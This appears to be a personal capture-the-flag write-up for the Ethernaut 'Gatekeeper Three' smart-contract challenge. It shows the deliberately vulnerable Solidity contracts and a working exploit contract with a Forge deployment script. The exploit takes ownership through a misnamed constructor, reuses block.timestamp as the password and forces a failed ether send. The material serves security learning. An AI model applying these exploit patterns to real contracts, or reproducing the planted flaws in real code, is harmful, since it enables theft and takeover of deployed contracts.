---
title: "Gatekeeper-Three"
date: "2024-02-25T10:56:00.000Z"
lastmod: "2024-03-12T09:33:00.000Z"
draft: false
difficulty: "⭐⭐⭐"
prev: "Good-Samaritan-6e915bab63034c2eb529ae24083e3523"
weight: 29
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/28"
next: "Switch-5a3e05038dd147309496128b2ad2bd09"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "5c1ce9c7-f141-4b5f-b252-ec899aa78e83"
  created_time: "2024-02-25T10:56:00.000Z"
  last_edited_time: "2024-03-12T09:33:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel28.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "aa1cb61f-428e-4dc4-abad-06b3092cb0ce"
        name: "⭐⭐⭐"
        color: "green"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Good-Samaritan-6e915bab63034c2eb529ae24083e3523"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Good-Samaritan-6e915bab63034c2eb529ae24083e3523"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 29
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/28"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Switch-5a3e05038dd147309496128b2ad2bd09"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Switch-5a3e05038dd147309496128b2ad2bd09"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Gatekeeper-Three"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Gatekeeper-Three"
          href: null
  url: "https://www.notion.so/Gatekeeper-Three-5c1ce9c7f1414b5fb252ec899aa78e83"
  public_url: null
UPDATE_TIME: "2024-03-19T16:42:53.413Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


Cope with gates and become an entrant.


### Things that might help:

- Recall return values of low-level functions.
- Be attentive with semantic.
- Refresh how storage works in Ethereum.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allowEntrance;

  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allowEntrance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree {
    entrant = tx.origin;
  }

  receive () external payable {}
}
```


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../lib/forge-std/src/console.sol";

interface GatekeeperThree {
  function owner() external returns(address);
  function entrant() external returns(address);
  function construct0r() external;
  function getAllowance(uint _password) external;
  function createTrick() external;
  function enter() external;
}

contract Attacker {

  function attack(GatekeeperThree gate) public payable {
    gate.construct0r();
    gate.createTrick();
    gate.getAllowance(block.timestamp);
    (bool success,) = payable(address(gate)).call{value: address(this).balance }("");
    require(success, 'call failed');
    gate.enter();
  }

  receive() external payable {
    revert();
  }
}
```


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Attacker,GatekeeperThree} from '../src/28.sol';

contract POC is Script {
	// First I've used this method to find the password but I didn't found why it 
	// wasn't working when broadcasted to sepolia so I just made everything in
	// one transaction
  function getUintValue(address targetContract, uint256 slot) public view returns (uint256) {
    bytes32 slotValue = vm.load(targetContract, bytes32(slot));
    return uint256(slotValue);
  }

  function run() external {
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    address addr = vm.envAddress("INSTANCE_28");

    vm.startBroadcast(deployerPrivateKey);

    GatekeeperThree gate = GatekeeperThree(payable(addr));
    Attacker attacker = new Attacker();

    console.log('entrant: %s', gate.entrant());
    console.log('owner: %s', gate.owner());

     attacker.attack{ value: 0.001001 ether }(gate);

    console.log('entrant: %s', gate.entrant());
    console.log('owner: %s', gate.owner());

    vm.stopBroadcast();

  }
}
```

